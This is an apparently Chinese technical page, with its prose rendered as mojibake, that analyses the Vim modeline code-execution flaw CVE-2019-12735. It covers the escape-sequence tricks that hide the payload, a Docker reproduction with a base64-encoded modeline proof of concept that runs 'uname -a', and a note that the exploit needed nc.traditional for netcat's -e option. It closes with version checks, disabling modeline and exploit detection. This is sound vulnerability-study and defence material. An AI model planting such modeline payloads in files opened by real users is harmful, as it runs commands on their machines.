<h5 id="x1bk">\x1b[K</h5>
<p>\x1b[K æ¸…é™¤å…‰æ ‡åˆ°å½“å‰ä½ç½®çš„å†…å®¹</p>
<pre><code class="shell"># *  ESC [ K           erase to end of line (inclusive)
# æ¸…é™¤å…‰æ ‡åˆ°å½“å‰ä½ç½®çš„å†…å®¹(ä¸ä¼šæ”¹å˜æ–‡æœ¬)ï¼Œå¯ä»¥é…åˆ\x1b[Gä½¿ç”¨
$ echo -e &quot;AAAA\x1b[1G\x1b[KBBBB&quot; &gt; a.txt
$ cat  a.txt
BBBB
$ echo -e &quot;ABCD\x1b[2G\x1b[KEEEE&quot; &gt; a.txt
$ cat  a.txt
AEEEE
$ echo -e &quot;ABCD\x1b[3G\x1b[KEEEE&quot; &gt; a.txt
$ cat a.txt 
ABEEEE
$ echo -e &quot;ABCD\x1b[KEEEE&quot; &gt; a.txt
$ cat a.txt 
ABCDEEEE

</code></pre>

<h5 id="x1b2k">\x1b[2K</h5>
<p><img alt="cve-2019-12735-01_p1.png" src="../img/cve-2019-12735-01_p1.png" />      </p>
<h5 id="x1b7l">\x1b[?7l</h5>
<ul>
<li>ESC [ ? 7 l       auto wrap off  </li>
<li>
<p>\x1b[?7l å…³é—­è‡ªåŠ¨æ¢è¡Œ (l -&gt; low)</p>
</li>
<li>
<p>\x1b[?7h å¼€å¯è‡ªåŠ¨æ¢è¡Œ (h -&gt; high)</p>
</li>
<li>è¿™ä¸ªå‘½ä»¤çš„åŠŸèƒ½æ˜¯æ§åˆ¶Terminalçš„æ˜¾ç¤ºåŠŸèƒ½ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ–‡æœ¬é•¿åº¦è¶…è¿‡Terminalçš„æ˜¾ç¤ºé•¿åº¦ï¼Œåˆ™ä¼šè‡ªåŠ¨æ¢è¡Œï¼Œå¦‚æœå…³é—­äº†è‡ªåŠ¨æ¢è¡Œï¼Œåˆ™ä¼šå…¨éƒ¨æ˜¾ç¤ºåœ¨ä¸€è¡Œï¼Œè¶…å‡ºçš„éƒ¨åˆ†è¢«"æˆªæ–­"</li>
</ul>
<p>â€‹<img alt="cve-2019-12735-01_p2.png.png" src="../img/cve-2019-12735-01_p2.png" />      </p>
<p>\x1b[?7l å’Œ \x1b[1G é…åˆä½¿ç”¨çš„æ•ˆæœï¼š</p>
<p>ä½¿ç”¨å‰ ï¼š   <br />
<img alt="cve-2019-12735-01_p3.png" src="../img/cve-2019-12735-01_p3.png" />               </p>
<p>ä½¿ç”¨åï¼š</p>
<p><img alt="cve-2019-12735-01_p4.png" src="../img/cve-2019-12735-01_p4.png" />      </p>
<p>\x1b[?7l å’Œ \x1b[1G + \x1b[K é…åˆä½¿ç”¨çš„æ•ˆæœï¼š      <br />
<img alt="cve-2019-12735-01_p5.png" src="../img/cve-2019-12735-01_p5.png" />      </p>
<h5 id="x16">\x16</h5>
<p>å‚è€ƒ:</p>
<p><a href="http://defindit.com/ascii.html">http://defindit.com/ascii.html</a><br />
<a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6">https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a>  </p>
<p>è¿™æ˜¯ä¸€ä¸ªasciiç çš„æ§åˆ¶å­—ç¬¦ï¼Œä»£è¡¨ ctrl+vï¼Œå®ƒçš„åŠŸèƒ½å¯ä»¥ç†è§£ä¸ºï¼šè®©ä¸‹ä¸€ä¸ªè¾“å…¥è¯†åˆ«ä¸ºæ™®é€šå­—ç¬¦</p>
<pre><code class="shell">$ cat a.py
a = input(&quot;&gt; &quot;)
print(ord(a[0]))

$ python3 a.py
# æƒ³ç›´æ¥è¾“å…¥ctrl+c, ä½†ç¨‹åºé€€å‡ºï¼Œè¢«è¯†åˆ«æˆäº†ä¸­æ–­ä¿¡å·
&gt; ^CTraceback (most recent call last):
  File &quot;a.py&quot;, line 1, in &lt;module&gt;
    a = input(&quot;&gt; &quot;)
KeyboardInterrupt

$ python3 a.py
# ä¾æ¬¡æŒ‰ä¸‹ctrl+vå’Œctrl+c, å°±é¡ºåˆ©æ‰“å°å‡ºäº†ctrl+cçš„asciiç 
&gt; ^C
3

</code></pre>

<p>ä¸ºä»€ä¹ˆExpä¸­éœ€è¦\x16æ§åˆ¶å­—ç¬¦</p>
<pre><code class="shell">echo -e &quot;iHello\x1b[D&quot; &gt; a.vim
$ vim 
:source! a.vim

Hello
~                                                                      ...   
~                                                                               
E388: Couldn't find definition

è¿™ä¸ªæŠ¥é”™å¯ä»¥æ‰‹åŠ¨è¾“å…¥ä¸‹é¢çš„æŒ‡ä»¤äº§ç”Ÿï¼š
$ vim
i
Hello
&lt;ESC&gt;
[
shift+d

# å¦‚æœåŠ ä¸Š\x16åˆ™\x1bä¸ä¼šè¢«è§£ææˆ&lt;ESC&gt;æŒ‰é”®ï¼Œè€Œæ˜¯è¾“å…¥å­—ç¬¦
echo -e &quot;iHello\x16\x1b[D&quot; &gt; a.vim

Hello^[[D
~                                                                      ...
~

-- INSERT --




</code></pre>

<h3 id="exp">expä¿®æ”¹è¯´æ˜</h3>
<ul>
<li>nc -&gt; nc.traditional </li>
</ul>
<p>Ubuntuä¸Šçš„ncä¸åŒ…å«-eé€‰é¡¹ï¼Œè§£å†³åŠæ³•æ˜¯å®‰è£…nc.traditionalæ¥æ›¿ä»£ncå‘½ä»¤</p>
<ul>
<li>\x1b[K -&gt; \x1b[2K å’Œ \x1b[D -&gt; \x1b[2D å’Œç©ºæ ¼æ˜¯ç”¨äºæ¸…é™¤ä¸å¯è§å­—ç¬¦\x16å’Œå¼•å·</li>
</ul>
<p>ä¿®æ”¹å‰: </p>
<p><img alt="cve-2019-12735-01_p6.png" src="../img/cve-2019-12735-01_p6.png" /></p>
<p><img alt="cve-2019-12735-01_p7.png" src="../img/cve-2019-12735-01_p7.png" />       </p>
<p>ä¿®æ”¹å:      <br />
<img alt="cve-2019-12735-01_p8.png" src="../img/cve-2019-12735-01_p8.png" />               </p>
<p><img alt="cve-2019-12735-01_p9.png" src="../img/cve-2019-12735-01_p9.png" />       </p>
<h3 id="vim_2">Vimå®‰è£…</h3>
<h4 id="apt">aptè‡ªåŠ¨å®‰è£…</h4>
<pre><code class="shell">apt-get install vim-runtime=2:7.4.1689-3ubuntu1
apt-get install vim-common=2:7.4.1689-3ubuntu1
apt-get install vim=2:7.4.1689-3ubuntu1

</code></pre>

<h4 id="deb">ä½¿ç”¨debåŒ…å®‰è£…</h4>
<p>é“¾æ¥:<a href="https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw">https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw</a> å¯†ç :m0qc</p>
<pre><code class="shell">sudo dpkg -i vim_2%3a7.4.1689-3ubuntu1_amd64.deb
</code></pre>

<h4 id="_2">ä¸‹è½½æºç æ‰‹åŠ¨ç¼–è¯‘</h4>
<pre><code class="shell"># ä¸‹è½½æºç ï¼Œç¼–è¯‘ç”Ÿæˆç¬¦å·
# å‚è€ƒï¼šhttps://www.unix.com/programming/156665-compile-debug-vim-source-code.html
$ mkdir ~/MyVim
$ cd ~/MyVim
$ sudo apt-get install libncurses5-dev libncursesw5-dev
$ apt-get source vim=2:7.4.1689-3ubuntu1
$ cd src
$ cp Makefile Makefile.orig
$ vim Makefile
$ diff Makefile Makefile.orig
540c540
&lt; CFLAGS = -g
---
&gt; #CFLAGS = -g
908c908
&lt; prefix = ~/MyVim
---
&gt; #prefix = $(HOME)
1852c1852
&lt; #    $(STRIP) $(DEST_BIN)/$(VIMTARGET)
---
&gt;     $(STRIP) $(DEST_BIN)/$(VIMTARGET)
$ cd ..
$ make &amp;&amp; make install
$ cd bin
$ gdb ./vim

</code></pre>

<h4 id="docker">Dockerå¤ç°ç¯å¢ƒæ­å»º</h4>
<p>å¯ä»¥é€šè¿‡Dockerå¿«é€Ÿæ­å»ºpocå¤ç°ç¯å¢ƒ</p>
<pre><code class="shell">$ ls
Dockerfile
$ cat Dockerfile
From ubuntu:16.04
RUN set -e -x ;\
    apt update ;\
    apt-get install -y vim-runtime=2:7.4.1689-3ubuntu1 ;\
    apt-get install -y vim-common=2:7.4.1689-3ubuntu1 ;\
    apt-get install -y vim=2:7.4.1689-3ubuntu1 ;\
    echo &quot;OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK&quot; | base64 --decode &gt; /root/poc.txt 

$ sudo docker build -t vim-cve-2019-12735 .
$ sudo docker run -it vim-cve-2019-12735 /bin/bash
echo -e &quot;set modeline\nset modelines=5&quot; &gt; ~/.vimrc 
cd root
vim poc.txt


</code></pre>

<h3 id="_3">æ¼æ´é˜²æŠ¤</h3>
<h4 id="package">packageç‰ˆæœ¬æ£€æŸ¥</h4>
<ul>
<li>æŸ¥çœ‹å¯å®‰è£…çš„Vimç‰ˆæœ¬</li>
</ul>
<pre><code class="shell"># æŸ¥çœ‹å¯å®‰è£…çš„Vimç‰ˆæœ¬
$ apt-cache policy vim
vim:
  Installed: (none)
  Candidate: 2:7.4.1689-3ubuntu1.4
  Version table:
     2:7.4.1689-3ubuntu1.4 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates/main amd64 Packages
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security/main amd64 Packages
     2:7.4.1689-3ubuntu1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial/main amd64 Packages

# ä»VimåŒ…çš„changelogä¸­è·å–ä¿®å¤æ¼æ´çš„ç‰ˆæœ¬å· 2:7.4.1689-3ubuntu1.3
$ cat vim_changelog.txt |grep CVE-2019-12735 -C 10
...
vim (2:7.4.1689-3ubuntu1.3) xenial-security; urgency=medium

  * SECURITY UPDATE: Arbitrary code execution
    - debian/patches/CVE-2019-12735.patch: disallow
      sourcing a file in the sandbox in src/getchar.c
    - CVE-2019-12735
  * SECURITY UPDATE: Buffer overflow
    - debian/patches/CVE-2017-5953.patch: check for an
      invalid length in order to avoid a overflow in
      src/spell.c.
    - CVE-2017-5953


 -- Leonidas S. Barbosa &lt;leo.barbosa@canonical.com&gt;  Fri, 07 Jun 2019 12:35:43 -0300


</code></pre>

<ul>
<li>å®‰è£…å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬</li>
</ul>
<pre><code class="shell">
$ sudo apt install vim-common=2:7.4.1689-3ubuntu1
$ sudo apt install vim-runtime=2:7.4.1689-3ubuntu1
$ sudo apt install vim=2:7.4.1689-3ubuntu1

# é€šè¿‡apt-cache æŸ¥çœ‹å·²å®‰è£…çš„ç‰ˆæœ¬ &lt; 2:7.4.1689-3ubuntu1.3
$ apt-cache policy vim:
  Installed: 2:7.4.1689-3ubuntu1
  Candidate: 2:7.4.1689-3ubuntu1.4
  ...

# é…ç½®vimrcå¼€å¯modelineåŠŸèƒ½
vim ~/.vimrc
i
set modeline
set modelines=5
&lt;ESC&gt;
:w

# æµ‹è¯•æ•ˆæœ
$ vim poc.txt

Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


Press ENTER or type command to cont

</code></pre>

<ul>
<li>å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„vim</li>
</ul>
<pre><code class="shell"># å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„vim
$ sudo apt install vim

# é€šè¿‡apt-cache æŸ¥çœ‹å·²å®‰è£…çš„ç‰ˆæœ¬ &gt; 2:7.4.1689-3ubuntu1.3
$ apt-cache policy vim
vim:
  Installed: 2:7.4.1689-3ubuntu1.4
  Candidate: 2:7.4.1689-3ubuntu1.4
  ...

# é…ç½®vimrcå¼€å¯modelineåŠŸèƒ½
vim ~/.vimrc
i
set modeline
set modelines=5
&lt;ESC&gt;


# æµ‹è¯•æ•ˆæœï¼Œæœªè§¦å‘æ¼æ´
$ vim poc.txt
:!uname -a||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\!\ \%&quot;):fdl=0:fdt=&quot;
~                                                                      ...                                                                    
~                                                                               
&quot;poc.txt&quot; 1L, 75C  

</code></pre>

<h4 id="_4">é…ç½®æ£€æŸ¥</h4>
<pre><code class="shell"># æ£€æŸ¥modelineé…ç½®:
$ vim
:verbose set modeline? 
:verbose set modelines?
# å¦‚æœæ˜¾ç¤ºnomodeline, nomodelinesè¡¨ç¤ºæ²¡æœ‰é…ç½®

# å¦‚æœé…ç½®äº†ï¼Œåˆ™ä¼šæ˜¾ç¤ºï¼š

...
ï½                                                                 
  modeline
        Last set from ~/.vimrc
Press ENTER or type command to continue

...
ï½
  modelines=5
        Last set from ~/.vimrc
Press ENTER or type command to continue

# å…³é—­modelineé…ç½®
vim ~/.vimrc
åˆ é™¤
set modeline
set modelines=5
æ·»åŠ 
set nomodeline
:wq

# å†æ¬¡æ£€æŸ¥
$ vim
:verbose set modeline? 

~                                                                     
nomodeline
        Last set from ~/.vimrc
Press ENTER or type command to continue


</code></pre>

<h4 id="poc">pocéªŒè¯</h4>
<p><strong>è¯»å–stdout</strong></p>
<p>ä»£ç æ‰§è¡Œvimæ‰“å¼€pocè¯»å–stdoutæ ¹æ®è¾“å‡ºåˆ¤æ–­(ç›®å‰çš„æ¥çœ‹ï¼Œè·å–vimçš„è¾“å‡ºè²Œä¼¼æœ‰äº›éº»çƒ¦)</p>
<p>ä¸å­˜åœ¨æ¼æ´æ—¶é‡å®šå‘stdout: </p>
<pre><code class="shell">$ vim poc.txt &gt;out.txt
Vim: Warning: Output is not to a terminal
$ cat out.txt 
# å†…å®¹ä¸ºç©º 

</code></pre>

<p>å­˜åœ¨æ¼æ´æ—¶é‡å®šå‘stdout: </p>
<pre><code class="shell">$ vim poc.txt &gt; out.txt
Vim: Warning: Output is not to a terminal

Press ENTER or type command to continue

$ cat out.txt 
Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


</code></pre>

<p><strong>æ£€æŸ¥è°ƒç”¨æ ˆ</strong></p>
<p>ç±»ä¼¼çš„ï¼Œé€šè¿‡ä»£ç æ‰§è¡Œvimæ‰“å¼€pocï¼Œptraceè°ƒç”¨æ ˆï¼Œæ£€æŸ¥æ˜¯å¦æœ‰do_shellè°ƒç”¨æ— æ¼æ´æ—¶æ­£å¸¸æ‰“å¼€pocæ–‡ä»¶åçš„è°ƒç”¨æ ˆï¼š</p>
<pre><code class="shell">gdb-peda$ bt
#0  0x00007fca6f40b5b3 in __select_nocancel ()
#1  0x000000000052a69c in RealWaitForChar (fd=0x0, 
#2  0x000000000052a444 in WaitForCharOrMouse 
#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)
#4  0x0000000000526147 in mch_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#5  0x00000000005c381e in ui_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#6  0x00000000004ad1fe in inchar (buf=0x86c66a &lt;typebuf_init+42&gt; &quot;&quot;, 
#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832
#8  0x00000000004ab07e in vgetc () at getchar.c:1605
#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801
#10 0x00000000004f8512 in normal_cmd (oap=0x7ffefbcad0c0, 
#11 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at 
#12 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffefbcad3b8) at 
...

</code></pre>

<p>å­˜åœ¨æ¼æ´æ—¶ï¼Œæ‰“å¼€pocæ–‡ä»¶åçš„è°ƒç”¨æ ˆï¼Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„do_shellçš„è°ƒç”¨:</p>
<pre><code class="shell">gdb-peda$ bt
#0  0x00007f4ba14135b3 in __select_nocancel ()
#1  0x000000000052a69c in RealWaitForChar (fd=0x0, 
#2  0x000000000052a444 in WaitForCharOrMouse 
#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)
#4  0x0000000000526147 in mch_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#5  0x00000000005c381e in ui_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#6  0x00000000004ad1fe in inchar (buf=0x86c66a &lt;typebuf_init+42&gt; &quot;&quot;, 
#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832
#8  0x00000000004ab07e in vgetc () at getchar.c:1605
#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801
#10 0x00000000004ce972 in wait_return (redraw=0x1) at message.c:901
#11 0x000000000045ce32 in do_shell (
    cmd=0x15c7ea0 &quot;uname -a||\&quot; vi:fen:fdm=expr:fde=assert_fails(\&quot;source!\\ %\&quot;):fdl=0:fdt=\&quot;&quot;, flags=0x0) at ex_cmds.c:1572
#12 0x000000000045c50c in do_bang (addr_count=0x0, 
#13 0x000000000047f480 in ex_bang (eap=0x7ffe20228c50) at 
#14 0x00000000004741d3 in do_one_cmd (cmdlinep=0x7ffe20228d80, 
#15 0x0000000000470d89 in do_cmdline (cmdline=0x0, 
#16 0x00000000005002cd in nv_colon (cap=0x7ffe202293f0) at 
#17 0x00000000004f9650 in normal_cmd (oap=0x7ffe20229480, 
#18 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at 
#19 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffe20229778) at 



</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../cve-2019-5736-åˆ†æ/" class="btn btn-neutral float-right" title="Cve 2019 5736 åˆ†æ">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2019-12735-åˆ†æ/" class="btn btn-neutral" title="Cve 2019 12735 åˆ†æ"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2019-12735-åˆ†æ/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../cve-2019-5736-åˆ†æ/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../../js/theme.js"></script>

</body>
</html>
